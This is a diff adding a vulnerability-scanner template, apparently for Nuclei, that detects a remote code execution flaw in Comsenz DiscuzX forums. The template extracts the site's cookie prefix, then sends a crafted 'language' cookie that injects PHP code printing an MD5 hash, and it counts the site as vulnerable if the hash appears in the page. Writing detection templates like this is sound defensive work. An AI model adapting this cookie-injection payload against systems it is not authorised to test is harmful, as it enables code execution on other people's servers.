@@ -1,0 +1,48 @@
+id: comsenz-discuzx-rce
+info:
+  name: Comsenz DiscuzX Remote Code Execution Detection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects a remote code execution vulnerability in Comsenz DiscuzX via crafted cookies.
+
+variables:
+  r1: "{{rand_int(800000000, 1000000000)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: initial-request
+    method: GET
+    path:
+      - "{{BaseURL}}/forum.php"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        name: token
+        regex:
+          - "cookiepre\\s*=\\s*'([\\w_]+)'"
+        group: 1
+        internal: true
+
+  - id: validation-request
+    method: GET
+    path:
+      - "{{BaseURL}}/forum.php"
+    headers:
+      Cookie: "{{token}}language=sc'.print(md5({{r1}})).'"
+    redirects: false
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(r1)}}"
+        part: body
